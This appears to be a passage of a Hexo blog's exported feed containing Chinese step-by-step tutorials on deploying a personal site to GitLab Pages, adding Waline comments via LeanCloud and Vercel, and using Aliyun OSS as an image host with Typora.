class="string">&quot;Generating static files...&quot;</span> <span class="literal">-ForegroundColor</span> Green</span><br><span class="line">hexo generate</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$LASTEXITCODE</span> <span class="operator">-ne</span> <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">Write-Error</span> <span class="string">&quot;hexo generate failed&quot;</span></span><br><span class="line">    <span class="keyword">exit</span> <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 3: Copy .gitlab-ci.yml to public directory</span></span><br><span class="line"><span class="built_in">Write-Host</span> <span class="string">&quot;Copying .gitlab-ci.yml to public directory...&quot;</span> <span class="literal">-ForegroundColor</span> Green</span><br><span class="line"><span class="variable">$source</span> = <span class="string">&quot;.\.gitlab-ci.yml&quot;</span></span><br><span class="line"><span class="variable">$destination</span> = <span class="string">&quot;.\public\.gitlab-ci.yml&quot;</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">Test-Path</span> <span class="variable">$source</span>) &#123;</span><br><span class="line">    <span class="built_in">Copy-Item</span> <span class="literal">-Path</span> <span class="variable">$source</span> <span class="literal">-Destination</span> <span class="variable">$destination</span> <span class="literal">-Force</span></span><br><span class="line">    <span class="built_in">Write-Host</span> <span class="string">&quot;File copied: <span class="variable">$source</span> -&gt; <span class="variable">$destination</span>&quot;</span> <span class="literal">-ForegroundColor</span> Yellow</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">Write-Error</span> <span class="string">&quot;.gitlab-ci.yml file not found, copy failed&quot;</span></span><br><span class="line">    <span class="keyword">exit</span> <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 4: Deploy Hexo</span></span><br><span class="line"><span class="built_in">Write-Host</span> <span class="string">&quot;Deploying Hexo...&quot;</span> <span class="literal">-ForegroundColor</span> Green</span><br><span class="line">hexo deploy</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$LASTEXITCODE</span> <span class="operator">-ne</span> <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">Write-Error</span> <span class="string">&quot;hexo deploy failed&quot;</span></span><br><span class="line">    <span class="keyword">exit</span> <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Write-Host</span> <span class="string">&quot;Deployment completed!&quot;</span> <span class="literal">-ForegroundColor</span> Green</span><br></pre></td></tr></table></figure>

<p>这个脚本的核心其实就是执行了四个命令，即：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo generate</span><br><span class="line">cp .\.gitlab-ci.yml .\public\.gitlab-ci.yml   # Linux 写法</span><br><span class="line">hexo deploy</span><br></pre></td></tr></table></figure>

<p>由于Windows PowerShell的默认执行策略受到限制，因此我们可能无法运行脚本。所以我们使用以下命令将执行策略设置为<code>Unrestricted</code>以执行脚本。 </p>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Set</span>-ExecutionPolicy <span class="comment">Unrestricted</span></span><br></pre></td></tr></table></figure>

<p>此外，由于.gitlab-ci.yml文件是隐藏文件，还需要到<strong>站点配置文件_config.yml</strong>中，将ignore_hidden设置为false（默认为true）。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">  <span class="attr">repository:</span> <span class="string">git@gitlab.com:xxxx/xxxx.gitlab.io.git</span></span><br><span class="line">  <span class="attr">branch:</span> <span class="string">main</span></span><br><span class="line">  <span class="attr">ignore_hidden:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure>

<p>完成配置后，只需运行脚本 <code>.\deploy.ps1</code> 即可更新网站，简单高效！</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>通过以上方法，无论是正确的 GitLab Pages 部署方式，还是取巧的补救方法，都能实现自动触发流水线，让 Hexo 部署到 GitLab Pages 的体验更加顺畅。</p>
]]></content>
      <categories>
        <category>个人网页搭建</category>
      </categories>
      <tags>
        <tag>个人网页</tag>
        <tag>Hexo</tag>
        <tag>Gitlab Pages</tag>
      </tags>
  </entry>
  <entry>
    <title>如何搭建个人网页（九）—— 评论系统（一）</title>
    <url>/2024/12/17/%E5%A6%82%E4%BD%95%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%BD%91%E9%A1%B5%EF%BC%88%E4%B9%9D%EF%BC%89%E2%80%94%E2%80%94%E8%AF%84%E8%AE%BA%E7%B3%BB%E7%BB%9F%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    <content><![CDATA[<h3 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h3><p>本章主要讲如何为个人网站增加评论系统。</p>
<p>评论系统我选择的是Waline，然后配置数据库和服务端有两种办法，第一种是使用Leancloud来做数据库，用Vercel来部署服务；第二种是用自己的云服务器来做数据库和服务端。本章先介绍第一种方法，即 <strong>Waline+Leancloud数据库+Vercel服务端</strong> 方案，下一章会介绍用服务器搭建的办法，建议两章都看完，比对后选择适合的方法。</p>
<p>可直接参考：<a href="https://waline.js.org/guide/get-started/">快速上手 | Waline</a></p>
<h3 id="Why-is-Waline"><a href="#Why-is-Waline" class="headerlink" title="Why is Waline"></a>Why is Waline</h3><blockquote>
<p>Waline 是一个简洁、高效、基于服务端的评论系统，适合静态网站使用。它以轻量化设计为核心，通过将评论存储和管理交给服务端（如 Vercel 或自建服务器），有效降低了前端的加载压力，同时支持 Markdown、表情、访问统计、匿名评论等功能，并拥有高度可定制的界面，满足多种场景需求。</p>
</blockquote>
<p>Waline是基于Valine开发的新版本（Valine的作者已放弃维护，存在许多bug），作为评论系统其有以下优势：</p>
<ol>
<li>Waline 不依赖繁重的前端脚本，加载速度快，对页面性能影响较小，特别适合静态站点。</li>
<li><strong>支持匿名评论，只需要设置昵称</strong>，其他评论系统基本都要求注册和登陆他们的账号。</li>
</ol>
<span id="more"></span>

<h3 id="Leancloud设置（数据库）"><a href="#Leancloud设置（数据库）" class="headerlink" title="Leancloud设置（数据库）"></a>Leancloud设置（数据库）</h3><blockquote>
<p><strong>LeanCloud</strong> 是一家提供云服务的技术公司，主要为开发者提供实时数据存储、消息推送、用户身份验证、云函数等服务。它帮助开发者快速构建和发布应用，提供了简便的 API 和 SDK，支持多种平台，包括移动端和 Web。LeanCloud 的目标是简化后端开发，使开发者能专注于产品和用户体验，而不必担心复杂的基础设施搭建和维护。</p>
</blockquote>
<p>Leancloud有国内版和国际版两种，两者各有优劣。国内版要求<strong>你的网站绑定了经过备案的域名，而国际版不允许大陆用户评论（要挂梯子）</strong>，请根据需要选择。</p>
<p>首先进入Leancloud官网（国内版）：<a href="https://www.leancloud.cn/">LeanCloud（美味书签）</a>，并根据需要选择是否切换到国际版，然后注册一个账号，并进入控制台。</p>
<p>然后点击左上角创建应用，填写一个喜欢的应用名称，并选择免费的开发版，创建。</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241217154421374.png" alt="image-20241217154421374" style="zoom: 50%;" />

<p>进入刚刚创建的应用设置，选择左下角 设置&#x2F;应用凭证，这里有三个参数 AppID、AppKey、MasterKey，等会会用到。</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/485377a11708b3fac67d449f387ce7bf.png" alt="485377a11708b3fac67d449f387ce7bf" style="zoom:50%;" />

<p>如果你选择的国内版，还要绑定一个备案过的域名，选择 设置&#x2F;域名绑定，然后点击 “API访问域名” 下的 “绑定新域名”，填入你的域名。此时页面上会出现一个CNAME，按照同第五章中提过的流程一样进行域名解析即可。</p>
<h3 id="Vercel部署（服务端）"><a href="#Vercel部署（服务端）" class="headerlink" title="Vercel部署（服务端）"></a>Vercel部署（服务端）</h3><blockquote>
<p><strong>Vercel</strong> 是一个面向前端开发的云平台，专注于为开发者提供极简易的部署和托管服务，特别适合现代 Web 应用的部署。Vercel 支持静态网站和动态 Web 应用的快速构建和发布，尤其与 React、Next.js 等前端框架兼容良好。通过自动化的 CI&#x2F;CD 流程，Vercel 能高效处理前端资源的部署和缩放，且提供全球 CDN 加速，极大提高了网页加载速度和性能。</p>
</blockquote>
<p>进入该页面：<a href="https://vercel.com/new/clone?repository-url=https://github.com/walinejs/waline/tree/main/example%E3%80%82">https://vercel.com/new/clone?repository-url=https%3A%2F%2Fgithub.com%2Fwalinejs%2Fwaline%2Ftree%2Fmain%2Fexample。</a></p>
<p>第一次进入会提示让你注册账号，建议用github账号快速注册。</p>
<p>在该页面，选择你的github账号，然后填写一个喜欢的项目名，点击Create。</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241217160420804.png" alt="image-20241217160420804" style="zoom:50%;" />

<p>此时 Vercel 会基于 Waline 模板帮助你新建并初始化仓库，仓库名为你之前输入的项目名。等待一两分钟后，看到Congratulations说明成功。点击 <code>Go to Dashboard</code> 可以跳转到应用的控制台。</p>
<p>点击顶部的 Settings&#x2F;Environment Variables 进入环境变量配置页，并配置三个环境变量 LEAN_ID, LEAN_KEY 和 LEAN_MASTER_KEY 。它们的值分别对应上一步在 LeanCloud 中获得的 APP ID, APP KEY, Master Key。如果使用的是Leancloud国内版，额外配置环境变量 Lean_Server，值为Leancloud绑定的域名。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/6b9ebca035184adfe85ea3c379991ae3.png" alt="6b9ebca035184adfe85ea3c379991ae3"></p>
<p>环境配置完成后，点击顶部的 <code>Deployments</code> 点击顶部最新的一次部署右侧的 <code>Redeploy</code> 按钮进行重新部署。该步骤是为了让刚才设置的环境变量生效。</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/34c27f5cd0a76419c51a99d267f9eb22.png" alt="34c27f5cd0a76419c51a99d267f9eb22" style="zoom:50%;" />

<h3 id="Next配置"><a href="#Next配置" class="headerlink" title="Next配置"></a>Next配置</h3><p>首先在blog&#x2F;目录下安装waline：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install @waline/hexo-next --save</span><br></pre></td></tr></table></figure>

<p>然后打开主题配置文件_config.next.yml，进行如下配置：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Waline 评论</span></span><br><span class="line"><span class="comment"># For more information: https://waline.js.org, https://github.com/walinejs/waline</span></span><br><span class="line"><span class="attr">waline:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span> <span class="comment">#是否开启</span></span><br><span class="line">  <span class="attr">serverURL:</span> <span class="string">blog-waline-comment.vercel.app</span> <span class="comment"># Waline服务端地址，我们这里就是上面部署的 Vercel 地址</span></span><br><span class="line">  <span class="attr">placeholder:</span> <span class="string">请文明评论呀~</span> <span class="comment"># #评论框的默认文字</span></span><br><span class="line">  <span class="attr">avatar:</span> <span class="string">mm</span> <span class="comment"># 头像风格</span></span><br><span class="line">  <span class="attr">meta:</span> [<span class="string">nick</span>, <span class="string">mail</span>, <span class="string">link</span>] <span class="comment"># 自定义评论框上面的三个输入框的内容</span></span><br><span class="line">  <span class="attr">pageSize:</span> <span class="number">10</span> <span class="comment"># 评论数量多少时显示分页</span></span><br><span class="line">  <span class="attr">lang:</span> <span class="string">zh-cn</span> <span class="comment"># 语言, 可选值: en, zh-cn</span></span><br><span class="line">  <span class="comment"># Warning: 不要同时启用 `waline.visitor` 以及 `leancloud_visitors`.</span></span><br><span class="line">  <span class="attr">visitor:</span> <span class="literal">true</span> <span class="comment"># 文章阅读统计</span></span><br><span class="line">  <span class="attr">comment_count:</span> <span class="literal">true</span> <span class="comment"># 如果为 false , 评论数量只会在当前评论页面显示, 主页则不显示</span></span><br><span class="line">  <span class="attr">requiredFields:</span> [<span class="string">nick</span>, <span class="string">mail</span>] <span class="comment"># 设置用户评论时必填的信息，[nick,mail]: [nick] | [nick, mail]</span></span><br><span class="line">  <span class="attr">libUrl:</span> <span class="comment"># Set custom library cdn url</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>个人网页搭建</category>
      </categories>
      <tags>
        <tag>个人网页</tag>
        <tag>Leancloud</tag>
        <tag>waline</tag>
        <tag>vercel</tag>
      </tags>
  </entry>
  <entry>
    <title>如何搭建个人网页（三）—— 图床</title>
    <url>/2024/12/12/%E5%A6%82%E4%BD%95%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%BD%91%E9%A1%B5%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94%E2%80%94%E5%9B%BE%E5%BA%8A/</url>
    <content><![CDATA[<h3 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h3><p>在markdown里插入的图片是默认保存在本地的，这样发布到线上之后肯定是无法看到的，因此我们需要借助图床来存储这些图片，本章将会讲如何购买oss，如何使用，以及typora的快速配置。</p>
<p>这一章其实与网页的搭建没什么直接关系，可以先暂时跳过。</p>
<p>本章特别鸣谢：<strong>lollipop</strong></p>
<h3 id="一-购买和配置OSS（对象存储服务）"><a href="#一-购买和配置OSS（对象存储服务）" class="headerlink" title="一 购买和配置OSS（对象存储服务）"></a>一 购买和配置OSS（对象存储服务）</h3><h4 id="为什么要用到OSS"><a href="#为什么要用到OSS" class="headerlink" title="为什么要用到OSS"></a>为什么要用到OSS</h4><p>Markdown 是一种轻量级的标记语言，常用于撰写博客文章、文档、论坛帖子等。在 Markdown 中插入图片时，通常需要用图片的 URL 来链接和显示图片。如果将图片直接存储在本地，博客更新、迁移或备份时可能会出现问题，因此我们常常将图片存储到图床中，然后markdown中插入这些图片的链接，就可以在任何地方都能看到这些图片了。</p>
<p>那么如何获得一个图床？<strong>OSS（对象存储服务）</strong> 可以作为图床的后端存储服务，提供图片存储、管理和分发功能。将图片存储到 OSS 中，可以利用 OSS 提供的高性能、高可靠性、低延迟的存储和访问能力，同时结合CDN 加速，确保全球用户快速访问图像资源。OSS 作为图床的后端存储，不仅可以支持图片的上传和存储，还可以根据需求提供各种功能，如图片处理、自动缩放、格式转换等。</p>
<p>一般好的OSS都是收费的，当然也有免费的OSS，但效果不好，我选择阿里云OSS。</p>
<p>简而言之：希望markdown中的图片可以在任何地方浏览 —-&gt; 用图床存图片 —-&gt;购买OSS当图床</p>
<span id="more"></span>

<h4 id="购买和配置OSS"><a href="#购买和配置OSS" class="headerlink" title="购买和配置OSS"></a>购买和配置OSS</h4><blockquote>
<p>阿里云 OSS（Object Storage Service）是阿里云提供的一种安全、可靠、高效的云存储服务，专为海量数据存储和管理而设计。它支持大规模的文件存储和高并发数据访问，提供了灵活的存储管理、数据备份、灾备、内容分发等功能。OSS 可以存储各种类型的数据，如图片、视频、音频、文档等，广泛应用于网站托管、数据备份、媒体处理等领域。</p>
</blockquote>
<p>我们选择购买阿里云OSS，具体步骤如下：</p>
<ol>
<li><p>注册一个阿里云账号（如果没有），建议用手机号注册，不会忘记。</p>
</li>
<li><p>访问阿里云官网OSS服务：<a href="https://www.aliyun.com/product/oss?spm=5176.21213303.J_qCOwPWspKEuWcmp8qiZNQ.1.2e282f3d3uIWJj&scm=20140722.S_card@@%E4%BA%A7%E5%93%81@@218843._.ID_card@@%E4%BA%A7%E5%93%81@@218843-RL_%E5%AF%B9%E8%B1%A1%E5%AD%98%E5%82%A8OSS-LOC_search~UND~card~UND~item-OR_ser-V_4-RE_cardNew-P0_0">对象存储 OSS_云存储服务_企业数据管理_存储-阿里云</a>，点击立即购买。</p>
</li>
<li><p>按所需的配置选择，我这里选的是 <strong>OSS资源包&#x2F;标准-本地冗余存储&#x2F;华东5（南京-本地地域）&#x2F;40GB&#x2F;3年</strong>，价格为27元。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241212232603586.png" alt="image-20241212232603586"></p>
</li>
<li><p>进入控制台（右上角），点击<strong>资源概览&#x2F;我的资源&#x2F;对象存储OSS</strong>，然后点击左边的Bucket列表，创建Bucket，起一个名称，依次选择<strong>地域-南京&#x2F;标准存储&#x2F;本地冗余存储</strong>，然后完成创建。</p>
</li>
<li><p>此时可以看到刚刚创建的bucket，点进去，左边栏选择“权限控制&#x2F;阻止公共访问”，将其关闭；然后“权限控制&#x2F;读写权限”，改为公共读。这样别人才能看到里面的东西。</p>
</li>
</ol>
<p>此时OSS就基本设置好了，我们可以在bucket里上传图片，然后复制文件url，最后在markdown插入图片时，填写该url即可。</p>
<h3 id="二-Typora快速配置"><a href="#二-Typora快速配置" class="headerlink" title="二 Typora快速配置"></a>二 Typora快速配置</h3><p>前面提到，尽管我们已经可以使用oss了，但这样还是太麻烦，可以对typora进行一些配置，这样我们在用typora写markdown时，插入图片会直接在oss里存储图片，非常方便，具体步骤如下：</p>
<ol>
<li><p>进入OSS控制台，再进入刚刚创建的bucket，左边栏选择“权限控制&#x2F;访问控制RAM”，然后点击“前往RAM控制台”。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/f11d4f9ff052fc2e847c48da7ac555fb.png" alt="f11d4f9ff052fc2e847c48da7ac555fb"></p>
</li>
<li><p>点击左边栏“身份管理&#x2F;用户”，然后创建用户。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/15303e3326b5b02336dec73c23b8f476.png" alt="15303e3326b5b02336dec73c23b8f476"></p>
</li>
<li><p>填写名称，勾选“使用永久AccessKey访问”。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241212235220229.png" alt="image-20241212235220229"></p>
</li>
<li><p><strong>此时可以看到AccessKeyID和AccessKeySecret，这个页面只会显示一次！记录下来，很关键。</strong></p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241213150502524.png" alt="image-20241213150502524"></p>
</li>
<li><p>回到刚刚的用户界面，给刚刚创建的用户添加权限，全选然后确定。</p>
</li>
<li><p>打开Typora，依次点击<strong>文件&#x2F;偏好设置&#x2F;图像</strong>，按下图所示选择，然后点击下载或更新（这里可能需要梯子）。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/c0ba21abb93799b19c2eb4e6420de246.png" alt="c0ba21abb93799b19c2eb4e6420de246"></p>
</li>
<li><p>点击打开配置文件，参考如下填写并保存，这里的accessKeyId和accessKeySecret在第4步中：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;picBed&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;uploader&quot;</span><span class="punctuation">:</span> <span class="string">&quot;aliyun&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;current&quot;</span><span class="punctuation">:</span> <span class="string">&quot;aliyun&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;aliyun&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;accessKeyId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;xxxxxxxx&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;accessKeySecret&quot;</span><span class="punctuation">:</span> <span class="string">&quot;xxxxxxxxx&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;bucket&quot;</span><span class="punctuation">:</span> <span class="string">&quot;jinqiqing-bucket&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;area&quot;</span><span class="punctuation">:</span> <span class="string">&quot;oss-cn-nanjing&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;img/&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;transformer&quot;</span><span class="punctuation">:</span> <span class="string">&quot;path&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;picgoPlugins&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;picgo-plugin-super-prefix&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;picgo-plugin-super-prefix&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;prefixFormat&quot;</span><span class="punctuation">:</span> <span class="string">&quot;YYYY/MM/DD/&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;fileFormat&quot;</span><span class="punctuation">:</span> <span class="string">&quot;YYYYMMDD-HHmmss&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>点击“验证图片上传选择”，测试是否成功。</p>
</li>
</ol>
<p>设置好了以后，在用typora写markdown时，直接将图片插入，就会自动上传到你的OSS中。</p>
<h3 id="继续"><a href="#继续" class="headerlink" title="继续"></a>继续</h3><p>接下来我们将回到个人网页，讲述如何安装和使用Hexo-Next——一种hexo主题，用来美化和丰富我们的网站。</p>
]]></content>
      <categories>
        <category>个人网页搭建</category>
      </categories>
      <tags>
        <tag>图床</tag>
        <tag>markdown</tag>
        <tag>oss</tag>
        <tag>阿里云</tag>
      </tags>
  </entry>
  <entry>
    <title>如何搭建个人网页（二）—— Gitlab Pages部署</title>
    <url>/2024/12/12/%E5%A6%82%E4%BD%95%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%BD%91%E9%A1%B5%EF%BC%88%E4%BA%8C%EF%BC%89%E2%80%94%E2%80%94Gitlab%20Pages%E9%83%A8%E7%BD%B2/</url>
    <content><![CDATA[<h3 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h3><p>前面讲到了Hexo的安装和基本使用，但是此时我们还是只能在本地预览网页，如何讲网页部署到线上去，让所有人都能看到呢？这里我们就将要借助gitlab pages的静态代码托管功能了。当然也有很多其他方案（详见第六章），但是gitlab pages是免费的，同时配置起来也比较简单。</p>
<p>本篇文章将主要讲搭建个人网页的第二步，包括gitlab基础，创建gitlab项目和gitlab pages部署。</p>
<h3 id="一-Gitlab"><a href="#一-Gitlab" class="headerlink" title="一 Gitlab"></a>一 Gitlab</h3><blockquote>
<p>GitLab 是一个基于 Git 的 DevOps 平台，集代码管理、持续集成&#x2F;持续部署（CI&#x2F;CD）、项目管理和版本控制于一体，为开发团队提供了从代码开发到部署的完整工具链。它支持私有仓库和公有仓库，提供了灵活的权限管理、代码评审功能以及高效的协作工具，适合团队协作开发。此外，GitLab 还具备强大的自动化能力和自托管选项，可以帮助团队提高开发效率并简化交付流程，是现代软件开发中的一站式解决方案。</p>
<p>Gitlab可以看作是另一个Github。</p>
</blockquote>
<p>首先，我们需要有一个gitlab账号，访问这里 <a href="https://gitlab.com注册和登录./">https://gitlab.com注册和登录。</a></p>
<p>记得在设置里将你的ssh公钥添加进去，具体操作可以参考<a href="https://blog.csdn.net/weixin_44867717/article/details/121751451">gitlab添加SSH密钥——查看本地密钥 &amp; 生成ssh密钥-CSDN博客</a>。</p>
<span id="more"></span>

<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/f8d0e345b6a8d9840bde785ceec41c50.png" alt="f8d0e345b6a8d9840bde785ceec41c50"></p>
<h3 id="二-创建gitlab项目"><a href="#二-创建gitlab项目" class="headerlink" title="二 创建gitlab项目"></a>二 创建gitlab项目</h3><p>在gitlab中，我们依次点击“项目&#x2F;新建项目&#x2F;创建空白项目”。</p>
<p>项目名称这里填 <strong>&lt;用户名&gt;.gitlab.io</strong>，可见性级别设为 <strong>public&#x2F;公开</strong>，将README.md去掉，然后新建项目。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241212203829525.png" alt="image-20241212203829525"></p>
<p>这个时候我们应该可以看到一个新的项目，并且里面是空的，后面我们网页的代码会被推送到这里，并自动构建部署。</p>
<p>注意这里，如下图所示，进入项目“设置&#x2F;通用&#x2F;可见性，项目功能，权限&#x2F;Pages”，把这个改成“具有访问权限的任何人”，不然其他人还是看不了你的网页的（这个点没教程提过，被坑惨了）。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/7a056885798b92df61c30c3bf8a9a72c.png" alt="7a056885798b92df61c30c3bf8a9a72c"></p>
<h3 id="三-Gitlab-Pages部署"><a href="#三-Gitlab-Pages部署" class="headerlink" title="三 Gitlab Pages部署"></a>三 Gitlab Pages部署</h3><blockquote>
<p>GitLab Pages 是 GitLab 提供的一项静态网站托管服务，允许用户通过 GitLab 仓库轻松部署和管理静态网站。它支持自定义域名和 HTTPS，并可以通过 GitLab CI&#x2F;CD 管道自动生成和部署网站，适用于个人博客、项目文档、产品宣传页等场景。用户可以自由选择生成静态网站的工具（如 Hexo、Jekyll、Hugo），并直接将代码推送到仓库中，由 GitLab Pages 负责构建和发布。其简单易用的特点让开发者无需额外配置服务器，即可快速上线静态网站。</p>
</blockquote>
<p>还记得我们的hexo项目吗？打开 <strong>&#x2F;blog&#x2F;_config.yml</strong>，这份文件很重要，我们称其为 <strong>站点配置文件</strong>，以后还会多次使用到它。</p>
<p>翻到最后的<strong>deploy</strong>，改成下面这样，注意这里的repository应该换成你的仓库名，例如：</p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">deploy:</span></span><br><span class="line"><span class="symbol">  type:</span> git</span><br><span class="line"><span class="symbol">  repository:</span> git@gitlab.com:jinqq/jinqq.gitlab.io.git</span><br><span class="line"><span class="symbol">  branch:</span> main</span><br></pre></td></tr></table></figure>

<p>按这样配置以后，hexo就知道应该把代码部署到哪里去了。</p>
<p>然后在blog&#x2F;目录下，首先安装Git部署插件：</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git <span class="comment">--save</span></span><br></pre></td></tr></table></figure>

<p>然后输入我们上一章讲过的三个命令：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo <span class="selector-tag">g</span>   </span><br><span class="line">hexo d </span><br></pre></td></tr></table></figure>

<p>如果你能看到类似下面的内容，说明成功了：<br><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241212204704488.png" alt="image-20241212204704488"></p>
<p>此时到我们的gitlab项目中，应该可以看到仓库中多了很多文件（如果你仔细观察，可以发现这些文件其实就是blog&#x2F;public里的内容，hexo d在这里就相当于进行了一次push操作）。</p>
<p>但此时我们还需要最后一步，在gitlab你的项目中，上传一份 .gitlab-ci.yml 文件，内容如下：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">pages:</span></span><br><span class="line">  <span class="attr">stage:</span> <span class="string">deploy</span></span><br><span class="line">  <span class="attr">script:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">mkdir</span> <span class="string">.public</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">cp</span> <span class="string">-r</span> <span class="string">./*</span> <span class="string">.public</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">rm</span> <span class="string">-rf</span> <span class="string">public</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">mv</span> <span class="string">.public</span> <span class="string">public</span></span><br><span class="line">  <span class="attr">artifacts:</span></span><br><span class="line">    <span class="attr">paths:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">public</span></span><br><span class="line">  <span class="attr">rules:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">if:</span> <span class="string">$CI_COMMIT_BRANCH</span> <span class="string">==</span> <span class="string">$CI_DEFAULT_BRANCH</span></span><br></pre></td></tr></table></figure>

<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/10caab19532c0d3c289bb85bacbfa38e.png" alt="10caab19532c0d3c289bb85bacbfa38e"></p>
<p>当gitlab看到这份文件后，就会自动开始CI&#x2F;CD构建。</p>
<blockquote>
<p>GitLab Pages 构建流程基于 GitLab CI&#x2F;CD 自动化完成：当你将代码推送到 GitLab 仓库后，GitLab 会读取 <code>.gitlab-ci.yml</code> 文件，触发 CI&#x2F;CD 流水线。通过 GitLab Runner，运行指定的命令生成静态文件（如 HTML、CSS、JS），并将这些文件作为 artifacts 部署到 GitLab Pages 服务器上。最终，网站会托管在一个默认 URL 或自定义域名下，用户可以直接访问。这一流程实现了从源码到静态网站的全自动化部署。</p>
</blockquote>
<p>此时只要等待构建成功即可，类似下面的状态。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241212205119906.png" alt="image-20241212205119906"></p>
<p>然后在浏览器访问<strong>https:&#x2F;&#x2F;&lt;你的用户名&gt;.gitlab.io</strong>，就可以看到你的网站已经成功部署了，大功告成！</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241212205348558.png" alt="image-20241212205348558"></p>
<p><strong>新注：在阅读完本章后，动手之前强烈建议先阅读第七章。</strong></p>
<h3 id="继续"><a href="#继续" class="headerlink" title="继续"></a>继续</h3><p>在第零章里我们提过，在markdown里插入的图片是默认保存在本地的，这样发布到线上之后肯定是无法看到的，因此我们需要借助图床来存储这些图片，接下来就会讲如何使用图床。</p>
]]></content>
      <categories>
